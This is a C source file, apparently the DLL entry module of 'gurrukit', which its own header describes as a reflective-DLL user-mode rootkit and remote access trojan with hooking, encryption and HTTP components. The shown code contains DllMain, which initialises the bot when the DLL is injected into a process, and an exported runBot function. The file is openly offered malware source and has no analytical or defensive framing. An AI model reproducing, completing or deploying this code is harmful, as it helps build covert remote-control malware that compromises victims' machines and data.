/*
	gurrukit (GPL): Reflective DLL Ring3 Rootkit and RAT
					External:
					-	SLRE Implementation of Regex (Regular Expressions) (Thank you ...)
					-	XML Implementation in C (XML Parser). Thank you ooxi.
					-	LDASM Disassembly Implementation (Thank you ...)
					
					-	BlowFish/RC4	Crypto Implementation
					-	Base64/ROT13	Encode Implementation
					-	LZ				Compress Implementation
					-	HTTP			WinHTTP
					-	HOOK			Minimalist Hook Engine (IAT/PageGuard)
					-	REFLECTIVE		Implementation of reflective DLL
					-	THREAD			Windows Threads
*/
#include <winsock2.h>
#include <windows.h>
#include "ReflectiveLoader.h"
#include "include/gurrukit.h"
#include "include/hooking.h"
#include "include/gurru.h"				//3l33t g0!

#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"wininet.lib")
//#pragma comment(lib, "normaliz.lib")
//#pragma comment(lib, "ntmsapi.lib")





HANDLE hMutex;
extern BOOL EAT_Hooked;
extern BOOL IAT_Hooked;
extern HINSTANCE hAppInstance;
BOOL WINAPI DllMain(HINSTANCE hInst, DWORD dwReason, LPVOID *lpReserved) {
	BOOL bReturn = TRUE;
	//void *a = GetProcAddress(LoadLibraryA("ntdll.dll"), "NT_STATUS");
//	gurruInit(TRUE);
	switch(dwReason) {
		case DLL_QUERY_HMODULE:
			if (lpReserved != NULL)
				*(HMODULE *)lpReserved = hAppInstance;
			break;
		case DLL_PROCESS_ATTACH:
			hAppInstance = hInst;
			//MessageBoxA(NULL, "Injected It1", "Injected it1", 0);
			gurruInit(FALSE);
			//HookingDefault();
			break;
		case DLL_THREAD_ATTACH:
			//MessageBoxA(NULL, "Injected It2", "Injected it2", 0); // DEBUG
		case DLL_THREAD_DETACH:
			bReturn = TRUE;
			break;
		case DLL_PROCESS_DETACH: 
			break;
		default:
			//MessageBoxA(NULL, "Injected It3", "Injected it3", 0);
			break;
	}
	
	return(TRUE);
}



/*
	EXPORTS
*/


GURRUDLL BOOL __stdcall runBot(void) {
	MEMORY_BASIC_INFORMATION lMemoryBasicInformation;
	DWORD oldProtect;
	ULONG base;

	base = (unsigned long)sysGetImageBase();
	gurruInit(TRUE);
	ReleaseMutex(hMutex);
	return(TRUE);
}

